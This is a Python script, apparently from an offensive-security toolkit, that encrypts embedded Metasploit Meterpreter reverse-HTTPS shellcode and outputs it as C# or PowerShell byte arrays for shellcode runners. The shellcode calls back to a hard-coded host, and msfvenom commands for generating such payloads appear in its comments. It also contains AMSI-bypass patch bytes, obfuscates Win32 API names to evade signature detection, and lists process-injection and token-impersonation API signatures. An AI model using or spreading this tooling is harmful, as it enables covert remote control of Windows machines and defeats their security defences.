from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
from os import urandom
import argparse

# ------------------
# AesEncryptor.py 
# ------------------
# This helper program will print various api names, x64 & x86 shellcode, a key and an IV using Aes256 CBC Encryption for use with NetRunners C# or AES Encrypted PowerShell Shellcode Runners.
# Author: @gustanini (Rafael Pimentel)
# Hacker Hermanos: https://linktr.ee/hackerhermanos

# ------------------
# Instructions
# ------------------
# Generate your x64 payload, save as buf in configuration section below: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.0 LPORT=443 EXITFUNC=thread -f python
# Generate your x86 payload, save as buf86 in configuration section below: msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.0.0 LPORT=443 EXITFUNC=thread -f python
# Run this program selecting your desired format (currently csharp or powershell).

# ------------------
# Functions
# ------------------
class Encryptor:

    # generate aes initialization vector 16 byte
    @staticmethod
    def generate_iv_aes():
        return urandom(16)
    # generate aes key 32 byte
    @staticmethod
    def generate_key_aes():
        return urandom(32)
    # aes encryptor: 256CBC, PKCS7 padding
    @staticmethod
    def encrypt_bytes_to_bytes_aes(plain_bytes, aes_key, aes_iv):
        # Encrypts a byte array using AES encryption with the given key.

        # :param plain_bytes: Byte array containing the unencrypted byte[] to encrypt.
        # :param aes_key: Byte array containing the encryption key.
        # :param aes_key: Byte array containing the initialization vector.
        # :return: Byte array containing the encrypted data.

        cipher = Cipher(algorithms.AES(aes_key), modes.CBC(aes_iv), backend=default_backend())
        encryptor = cipher.encryptor()
        padder = padding.PKCS7(algorithms.AES.block_size).padder()
        padded_data = padder.update(plain_bytes) + padder.finalize()
        encrypted = encryptor.update(padded_data) + encryptor.finalize()
        return aes_iv + encrypted
    @staticmethod
    def encrypt_bytes_to_bytes_xor(plain_bytes, xor_key):
        # Encrypts a byte array using XOR encryption with the given key.
        
        # :param plain_bytes: Byte array containing the unencrypted byte[] to encrypt.
        # :param xor_key: Byte array containing the encryption key.
        # :return: Byte array containing the encrypted data.

        if not xor_key:
            raise ValueError("Key cannot be empty.")
        ciphertext_bytes = bytes([b ^ xor_key[i % len(xor_key)] for i, b in enumerate(plain_bytes)])
        return ciphertext_bytes

    # ------------------
    # POWERSHELL PRINTER
    # ------------------
    # printer, outputs to powershell format
    @staticmethod
    def to_powershell_byte_array(byte_data):
        return ', '.join(f'0x{b:02X}' for b in byte_data)
    # print in powershell format
    @staticmethod
    def print_powershell():
        # print key, IV
        print(f"[Byte[]] $AesKey = {Encryptor.to_powershell_byte_array(aes_key)}")
        print(f"[Byte[]] $AesIV = {Encryptor.to_powershell_byte_array(aes_iv)}")
        
        # print encrypted data
        # x64 C2 payload
        encrypted_data = Encryptor.encrypt_bytes_to_bytes_aes(buf, aes_key, aes_iv)
        print(f"[Byte[]] $buf = {Encryptor.to_powershell_byte_array(encrypted_data)}")         

        # x86 C2 payload
        encrypted_data = Encryptor.encrypt_bytes_to_bytes_aes(buf86, aes_key, aes_iv)        
        print(f"[Byte[]] $buf86 = {Encryptor.to_powershell_byte_array(encrypted_data)}")       

        # amsi patches
        for patch_name, patch_bytes in AMSI_PATCH_MAP.items():
            encrypted_data = Encryptor.encrypt_bytes_to_bytes_aes(patch_bytes, aes_key, aes_iv)
            print(f"[Byte[]] ${patch_name} = {Encryptor.to_powershell_byte_array(encrypted_data)}")

        # api names
        API_NAME_MAP["AmsiSb"] = "AmsiScanBuffer".encode() # add amsiscanbuffer as "AmsiSb" to avoid sig detection

        for api_name, api_bytes in API_NAME_MAP.items():
            encrypted_data = Encryptor.encrypt_bytes_to_bytes_aes(api_bytes, aes_key, aes_iv)
            print(f"[Byte[]] ${api_name.replace('.', '')}_Bytes = {Encryptor.to_powershell_byte_array(encrypted_data)}")

    # ------------------
    # CSHARP PRINTER
    # ------------------
    # printer, outputs to csharp format
    @staticmethod
    def to_csharp_byte_array(byte_data):
        return ', '.join(f'0x{b:02X}' for b in byte_data)
    # print in csharp format
    @staticmethod
    def print_csharp():
        # print key, IV
        print("public static byte[] AesKey =" + "{" + f"{Encryptor.to_csharp_byte_array(aes_key)}" + "};")
        print("public static byte[] AesIv =" + "{" + f"{Encryptor.to_csharp_byte_array(aes_iv)}" + "};")
        
        # print encrypted data
        # x64 C2 payload
        encrypted_data = Encryptor.encrypt_bytes_to_bytes_aes(buf, aes_key, aes_iv)
        print("public static byte[] buf =" + "{" + f"{Encryptor.to_csharp_byte_array(encrypted_data)}" + "};")

        # x86 C2 payload
        encrypted_data = Encryptor.encrypt_bytes_to_bytes_aes(buf86, aes_key, aes_iv)        
        print("public static byte[] buf86 =" + "{" + f"{Encryptor.to_csharp_byte_array(encrypted_data)}" + "};")

        # print unencrypted buf sizes (encrypted buf size is different)
        print(f"public static int sBuf = {len(buf)};")
        print(f"public static int sBuf86 = {len(buf86)};")

        # amsi patches
        for patch_name, patch_bytes in AMSI_PATCH_MAP.items():
            encrypted_data = Encryptor.encrypt_bytes_to_bytes_aes(patch_bytes, aes_key, aes_iv)
            print(f"public static byte[] {patch_name} =" + "{" + f"{Encryptor.to_csharp_byte_array(encrypted_data)}" + "};")

        # api names
        API_NAME_MAP["AmsiScanBuffer"] = "AmsiScanBuffer".encode() # add amsiscanbuffer for use with netrunners
        for api_name, api_bytes in API_NAME_MAP.items():
            encrypted_data = Encryptor.encrypt_bytes_to_bytes_aes(api_bytes, aes_key, aes_iv)
            print(f"public static byte[] {api_name.replace('.', '')}_Bytes =" + "{" + f"{Encryptor.to_csharp_byte_array(encrypted_data)}" + "};")

    # ------------------
    # CSHARP PRINTER (XOR)
    # ------------------
    # print in csharp format using xor encryption
    @staticmethod
    def print_csharp_xor():
        # print key, IV
        print("public static byte[] xor_key =" + "{" + f"{Encryptor.to_csharp_byte_array(xor_key)}" + "};")
        
        # print encrypted data
        # x64 C2 payload
        encrypted_data = Encryptor.encrypt_bytes_to_bytes_xor(buf, xor_key)
        print("public static byte[] buf =" + "{" + f"{Encryptor.to_csharp_byte_array(encrypted_data)}" + "};")

        # x86 C2 payload
        encrypted_data = Encryptor.encrypt_bytes_to_bytes_xor(buf86, xor_key)
        print("public static byte[] buf86 =" + "{" + f"{Encryptor.to_csharp_byte_array(encrypted_data)}" + "};")

        # print unencrypted buf sizes (encrypted buf size is different)
        print(f"public static int sBuf = {len(buf)};")
        print(f"public static int sBuf86 = {len(buf86)};")

        # amsi patches
        for patch_name, patch_bytes in AMSI_PATCH_MAP.items():
            encrypted_data = Encryptor.encrypt_bytes_to_bytes_xor(patch_bytes, xor_key)
            print(f"public static byte[] {patch_name} =" + "{" + f"{Encryptor.to_csharp_byte_array(encrypted_data)}" + "};")

        # api names
        API_NAME_MAP["AmsiScanBuffer"] = "AmsiScanBuffer".encode() # add amsiscanbuffer for use with netrunners
        for api_name, api_bytes in API_NAME_MAP.items():
            encrypted_data = Encryptor.encrypt_bytes_to_bytes_xor(api_bytes, xor_key)
            print(f"public static byte[] {api_name.replace('.', '')}_Bytes =" + "{" + f"{Encryptor.to_csharp_byte_array(encrypted_data)}" + "};")

    # ------------------
    # CSHARP DELEGATE PRINTER
    # ------------------
    # print csharp delegates (getprocaddress, getmodulehandle)
    @staticmethod
    def print_csharp_delegates(pinvoke_signatures):
        for signature in pinvoke_signatures:
            lines = signature.split('\n')
            if len(lines) != 2:
                print("Invalid P/Invoke signature format. It should have exactly 2 lines.")
                continue
            
            # Parse DllImport lines
            attributes_line = lines[0].strip()
            method_signature = lines[1].strip()
            
            #method_parts = method_signature.split(' ')
            
            # Parse variables
            data_type = method_signature.split(" ")[3]
            api_name = method_signature.split(" ")[4].split("(")[0]
            parameters = method_signature.split("(")[1].split(")")[0]
            dll_name = attributes_line.split('"')[1]
            

            # Generate C# code
            delegate_code = (
                f"//// import {api_name.upper()}\n"
                f"public delegate {data_type} p{api_name}({parameters});\n"
                f"public static p{api_name} {api_name} = (p{api_name})Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle(\"{dll_name}\"), DecryptBytesToStringAes({api_name}_Bytes, AesKey)), typeof(p{api_name}));\n"
            )
            print(delegate_code)

# ------------------
# Configuration Section
# ------------------

# paste x64 buf here
buf =  b""
buf += b"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51"
buf += b"\x41\x50\x52\x48\x31\xd2\x51\x65\x48\x8b\x52\x60"
buf += b"\x56\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x0f\xb7"
buf += b"\x4a\x4a\x48\x8b\x72\x50\x4d\x31\xc9\x48\x31\xc0"
buf += b"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
buf += b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b"
buf += b"\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
buf += b"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48"
buf += b"\x85\xc0\x74\x67\x48\x01\xd0\x50\x44\x8b\x40\x20"
buf += b"\x8b\x48\x18\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41"
buf += b"\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
buf += b"\x41\xc1\xc9\x0d\xac\x41\x01\xc1\x38\xe0\x75\xf1"
buf += b"\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44"
buf += b"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
buf += b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58"
buf += b"\x48\x01\xd0\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
buf += b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
buf += b"\x59\x5a\x48\x8b\x12\xe9\x4b\xff\xff\xff\x5d\x48"
buf += b"\x31\xdb\x53\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74"
buf += b"\x00\x41\x56\x48\x89\xe1\x49\xc7\xc2\x4c\x77\x26"
buf += b"\x07\xff\xd5\x53\x53\xe8\x82\x00\x00\x00\x4d\x6f"
buf += b"\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x57"
buf += b"\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x31\x30"
buf += b"\x2e\x30\x3b\x20\x57\x69\x6e\x36\x34\x3b\x20\x78"
buf += b"\x36\x34\x29\x20\x41\x70\x70\x6c\x65\x57\x65\x62"
buf += b"\x4b\x69\x74\x2f\x35\x33\x37\x2e\x33\x36\x20\x28"
buf += b"\x4b\x48\x54\x4d\x4c\x2c\x20\x6c\x69\x6b\x65\x20"
buf += b"\x47\x65\x63\x6b\x6f\x29\x20\x43\x68\x72\x6f\x6d"
buf += b"\x65\x2f\x31\x33\x31\x2e\x30\x2e\x30\x2e\x30\x20"
buf += b"\x53\x61\x66\x61\x72\x69\x2f\x35\x33\x37\x2e\x33"
buf += b"\x36\x20\x45\x64\x67\x2f\x31\x33\x31\x2e\x30\x2e"
buf += b"\x32\x39\x30\x33\x2e\x38\x36\x00\x59\x53\x5a\x4d"
buf += b"\x31\xc0\x4d\x31\xc9\x53\x53\x49\xba\x3a\x56\x79"
buf += b"\xa7\x00\x00\x00\x00\xff\xd5\xe8\x0d\x00\x00\x00"
buf += b"\x31\x30\x2e\x31\x30\x2e\x31\x34\x2e\x31\x30\x39"
buf += b"\x00\x5a\x48\x89\xc1\x49\xc7\xc0\xbb\x01\x00\x00"
buf += b"\x4d\x31\xc9\x53\x53\x6a\x03\x53\x49\xba\x57\x89"
buf += b"\x9f\xc6\x00\x00\x00\x00\xff\xd5\xe8\x57\x00\x00"
buf += b"\x00\x2f\x58\x5f\x45\x6e\x74\x64\x4f\x43\x31\x75"
buf += b"\x38\x6d\x65\x69\x64\x34\x54\x6d\x6b\x42\x43\x67"
buf += b"\x69\x73\x31\x35\x4b\x6a\x69\x4d\x53\x74\x68\x4a"
buf += b"\x44\x68\x6b\x43\x51\x57\x52\x63\x65\x67\x6a\x57"
buf += b"\x67\x43\x5a\x46\x63\x7a\x68\x55\x58\x6a\x30\x68"
buf += b"\x76\x49\x32\x65\x32\x4d\x41\x4a\x72\x34\x71\x57"
buf += b"\x54\x34\x6c\x4f\x64\x76\x75\x6d\x33\x50\x35\x59"
buf += b"\x65\x6b\x69\x00\x48\x89\xc1\x53\x5a\x41\x58\x4d"
buf += b"\x31\xc9\x53\x48\xb8\x00\x32\xa8\x84\x00\x00\x00"
buf += b"\x00\x50\x53\x53\x49\xc7\xc2\xeb\x55\x2e\x3b\xff"
buf += b"\xd5\x48\x89\xc6\x6a\x0a\x5f\x48\x89\xf1\x6a\x1f"
buf += b"\x5a\x52\x68\x80\x33\x00\x00\x49\x89\xe0\x6a\x04"
buf += b"\x41\x59\x49\xba\x75\x46\x9e\x86\x00\x00\x00\x00"
buf += b"\xff\xd5\x4d\x31\xc0\x53\x5a\x48\x89\xf1\x4d\x31"
buf += b"\xc9\x4d\x31\xc9\x53\x53\x49\xc7\xc2\x2d\x06\x18"
buf += b"\x7b\xff\xd5\x85\xc0\x75\x1f\x48\xc7\xc1\x88\x13"
buf += b"\x00\x00\x49\xba\x44\xf0\x35\xe0\x00\x00\x00\x00"
buf += b"\xff\xd5\x48\xff\xcf\x74\x02\xeb\xaa\xe8\x55\x00"
buf += b"\x00\x00\x53\x59\x6a\x40\x5a\x49\x89\xd1\xc1\xe2"
buf += b"\x10\x49\xc7\xc0\x00\x10\x00\x00\x49\xba\x58\xa4"
buf += b"\x53\xe5\x00\x00\x00\x00\xff\xd5\x48\x93\x53\x53"
buf += b"\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0"
buf += b"\x00\x20\x00\x00\x49\x89\xf9\x49\xba\x12\x96\x89"
buf += b"\xe2\x00\x00\x00\x00\xff\xd5\x48\x83\xc4\x20\x85"
buf += b"\xc0\x74\xb2\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75"
buf += b"\xd2\x58\xc3\x58\x6a\x00\x59\xbb\xe0\x1d\x2a\x0a"
buf += b"\x41\x89\xda\xff\xd5"


# paste x86 buf here as buf86
buf86 =  b""
buf86 += b"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64"
buf86 += b"\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a"
buf86 += b"\x26\x31\xff\x8b\x72\x28\x31\xc0\xac\x3c\x61\x7c"
buf86 += b"\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49\x75\xef\x52"
buf86 += b"\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78"
buf86 += b"\x85\xc0\x74\x4c\x01\xd0\x8b\x48\x18\x50\x8b\x58"
buf86 += b"\x20\x01\xd3\x85\xc9\x74\x3c\x49\x31\xff\x8b\x34"
buf86 += b"\x8b\x01\xd6\x31\xc0\xc1\xcf\x0d\xac\x01\xc7\x38"
buf86 += b"\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58"
buf86 += b"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
buf86 += b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b"
buf86 += b"\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12"
buf86 += b"\xe9\x80\xff\xff\xff\x5d\x68\x6e\x65\x74\x00\x68"
buf86 += b"\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5"
buf86 += b"\x31\xdb\x53\x53\x53\x53\x53\xe8\x76\x00\x00\x00"
buf86 += b"\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20"
buf86 += b"\x28\x4d\x61\x63\x69\x6e\x74\x6f\x73\x68\x3b\x20"
buf86 += b"\x49\x6e\x74\x65\x6c\x20\x4d\x61\x63\x20\x4f\x53"
buf86 += b"\x20\x58\x20\x31\x30\x5f\x31\x35\x5f\x37\x29\x20"
buf86 += b"\x41\x70\x70\x6c\x65\x57\x65\x62\x4b\x69\x74\x2f"
buf86 += b"\x35\x33\x37\x2e\x33\x36\x20\x28\x4b\x48\x54\x4d"
buf86 += b"\x4c\x2c\x20\x6c\x69\x6b\x65\x20\x47\x65\x63\x6b"
buf86 += b"\x6f\x29\x20\x43\x68\x72\x6f\x6d\x65\x2f\x31\x33"
buf86 += b"\x31\x2e\x30\x2e\x30\x2e\x30\x20\x53\x61\x66\x61"
buf86 += b"\x72\x69\x2f\x35\x33\x37\x2e\x33\x36\x00\x68\x3a"
buf86 += b"\x56\x79\xa7\xff\xd5\x53\x53\x6a\x03\x53\x53\x68"
buf86 += b"\xbb\x01\x00\x00\xe8\x0c\x01\x00\x00\x2f\x31\x4f"
buf86 += b"\x72\x77\x55\x76\x62\x54\x78\x67\x6b\x6f\x57\x53"
buf86 += b"\x6c\x59\x51\x45\x6f\x50\x31\x77\x61\x68\x31\x2d"
buf86 += b"\x78\x4a\x4c\x76\x58\x59\x39\x63\x73\x6c\x37\x32"
buf86 += b"\x2d\x38\x76\x53\x74\x35\x41\x56\x53\x74\x33\x71"
buf86 += b"\x46\x36\x41\x4c\x48\x43\x57\x32\x46\x30\x68\x52"
buf86 += b"\x45\x56\x43\x51\x69\x53\x45\x66\x36\x77\x36\x30"
buf86 += b"\x62\x64\x47\x6c\x48\x4e\x74\x61\x79\x2d\x30\x47"
buf86 += b"\x46\x65\x47\x66\x56\x54\x43\x4e\x61\x4e\x61\x39"
buf86 += b"\x59\x4a\x62\x41\x71\x35\x66\x54\x6b\x2d\x50\x59"
buf86 += b"\x31\x61\x46\x53\x6f\x79\x79\x48\x66\x33\x51\x76"
buf86 += b"\x46\x00\x50\x68\x57\x89\x9f\xc6\xff\xd5\x89\xc6"
buf86 += b"\x53\x68\x00\x32\xe8\x84\x53\x53\x53\x57\x53\x56"
buf86 += b"\x68\xeb\x55\x2e\x3b\xff\xd5\x96\x6a\x0a\x5f\x68"
buf86 += b"\x80\x33\x00\x00\x89\xe0\x6a\x04\x50\x6a\x1f\x56"
buf86 += b"\x68\x75\x46\x9e\x86\xff\xd5\x53\x53\x53\x53\x56"
buf86 += b"\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x75\x14\x68"
buf86 += b"\x88\x13\x00\x00\x68\x44\xf0\x35\xe0\xff\xd5\x4f"
buf86 += b"\x75\xcd\xe8\x49\x00\x00\x00\x6a\x40\x68\x00\x10"
buf86 += b"\x00\x00\x68\x00\x00\x40\x00\x53\x68\x58\xa4\x53"
buf86 += b"\xe5\xff\xd5\x93\x53\x53\x89\xe7\x57\x68\x00\x20"
buf86 += b"\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85"
buf86 += b"\xc0\x74\xcf\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58"
buf86 += b"\xc3\x5f\xe8\x6b\xff\xff\xff\x31\x30\x2e\x31\x30"
buf86 += b"\x2e\x31\x34\x2e\x31\x30\x39\x00\xbb\xe0\x1d\x2a"
buf86 += b"\x0a\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
buf86 += b"\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00"
buf86 += b"\x53\xff\xd5"


# amsi patches dictionary
AMSI_PATCH_MAP = {
    "AmsiPatch" : bytes([0xb8, 0x34, 0x12, 0x07, 0x80, 0x66, 0xb8, 0x32, 0x00, 0xb0, 0x57, 0xc3]),
    "AmsiPatch86" : bytes([0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]) # this unencrypted payload is flagged
}

# Win32 api names
API_NAMES = [
    "CloseHandle",
    "ConnectNamedPipe",
    "ConvertSidToStringSidW",
    "CreateNamedPipeW",
    "CreateProcessA",
    "CreateProcessWithTokenW",
    "CreateRemoteThread",
    "CreateThread",
    "CreateToolhelp32Snapshot",
    "DuplicateTokenEx",
    "FlsAlloc",
    "GetCurrentProcess",
    "GetCurrentThread",
    "GetStdHandle",
    "GetTokenInformation",
    "ImpersonateNamedPipeClient",
    "IsWow64Process",
    "LoadLibraryA",
    "OpenProcess",
    "OpenThread",
    "OpenThreadToken",
    "Process32First",
    "Process32Next",
    "ReadProcessMemory",
    "ResumeThread",
    "SuspendThread",
    "VirtualAlloc",
    "VirtualAllocEx",
    "VirtualAllocExNuma",
    "VirtualProtect",
    "VirtualProtectEx",
    "WaitForSingleObject",
    "WriteProcessMemory",
    "ZwQueryInformationProcess",
    # patcher
    "NtTraceEvent",
    "amsi.dll"  # to-do take this outta here
]
API_NAME_MAP = {api: api.encode() for api in sorted(API_NAMES)}
# Win32 API PINVOKE SIGS
pinvoke_signatures = [
    '''[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern bool CloseHandle(IntPtr handle);''',
    '''[DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);''',
    '''[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern bool ConvertSidToStringSidW(IntPtr pSID, out IntPtr ptrSid);''',
    '''[DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateNamedPipeW(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);''',
    '''[DllImport("kernel32.dll", SetLastError = true)]
    public static extern int CreateProcessA(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, int bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);''',
    '''[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern bool CreateProcessWithTokenW(IntPtr hToken, UInt32 dwLogonFlags, string lpApplicationName, string lpCommandLine, UInt32 dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);''',
    '''[DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);''',
    '''[DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);''',
    '''[DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);''',
    '''[DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);''',
    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr FlsAlloc(IntPtr lpCallback);''',
    '''[DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetCurrentProcess();''',
    '''[DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetCurrentThread();''',
    '''[DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetStdHandle(int nStdHandle);''',
    '''[DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);''',
    '''[DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);''',
    '''[DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi)]
    public static extern bool IsWow64Process([In] IntPtr hProcess, [Out] out bool lpSystemInfo);''',
    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr LoadLibraryA(string name);''',
    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr OpenProcess(uint processAccess, int bInheritHandle, UInt32 processId);''',
    '''[DllImport("kernel32.dll")]
    public static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);''',
    '''[DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);''',
    '''[DllImport("kernel32.dll")]
    public static extern int Process32First(IntPtr hSnapshot, ref ProcessEntry32 lppe);''',
    '''[DllImport("kernel32.dll")]
    public static extern int Process32Next(IntPtr hSnapshot, ref ProcessEntry32 lppe);''',
    '''[DllImport("kernel32.dll", SetLastError = true)]
    public static extern int ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);''',
    '''[DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint ResumeThread(IntPtr hThread);''',
    '''[DllImport("kernel32.dll")]
    public static extern uint SuspendThread(IntPtr hThread);''',
    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);''',
    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);''',
    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);''',
    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern int VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);''',
    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern int VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);''',
    '''[DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);''',
    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern int WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);''',
    '''[DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
    public static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);'''
]
pinvoke_signatures = sorted(pinvoke_signatures)

# ------------------
# Main Function
# ------------------
# Define a main function to handle argument parsing
def main():
    # Create the parser
    parser = argparse.ArgumentParser(description="Encryptor Script")
    # Add arguments
    parser.add_argument("-csharp", action="store_true", help="Print the output in C# format.")
    parser.add_argument("-csdelegates", action="store_true", help="Print win32 api delegates in C# format.")
    parser.add_argument("-powershell", action="store_true", help="Print the output in PowerShell format.")
    parser.add_argument("-xor", action="store_true", help="Print the output in C# format using XOR encryption.")

    # Parse the arguments
    args = parser.parse_args()

    if args.csharp:
        Encryptor.print_csharp()
    elif args.xor:
        Encryptor.print_csharp_xor()
    elif args.powershell:
        Encryptor.print_powershell()
    elif args.csdelegates:
        Encryptor.print_csharp_delegates(pinvoke_signatures)
    else:
        Encryptor.print_powershell()

if __name__ == "__main__":
    # generate keys
    aes_key = Encryptor.generate_key_aes()
    aes_iv = Encryptor.generate_iv_aes()
    xor_key = b".pdata"
    
    main()

# ------------------
# To-Do
# ------------------

# add -c format
# add -vba format (decimal)
# add powershell delegates
# refactor functions to make them more efficient/flexible
# split apis and dlls into two different arrays